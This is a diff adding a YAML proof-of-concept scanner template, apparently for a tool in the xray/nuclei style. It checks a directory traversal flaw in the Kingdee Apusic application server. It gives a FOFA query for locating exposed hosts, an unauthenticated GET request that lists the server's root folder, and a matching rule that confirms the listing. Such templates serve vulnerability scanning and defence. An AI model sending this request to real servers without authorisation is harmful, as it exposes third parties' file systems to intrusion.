@@ -1,0 +1,16 @@
+id: poc-yaml-apusic-server-file-directory-traversal
+info:
+  name: 金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 目录遍历
+  finger: Apusic应用服务器
+  fofa: app="Apusic应用服务器"
+requests:
+- method: GET
+  path: /admin/protected/selector/server_file/files?folder=/
+  expression: status_code == 200 && contains(body,"\"name\":") && contains(body,"\"folder\":true")
+    && contains(body,"\"path\"")
+variables: {}
+transport: http
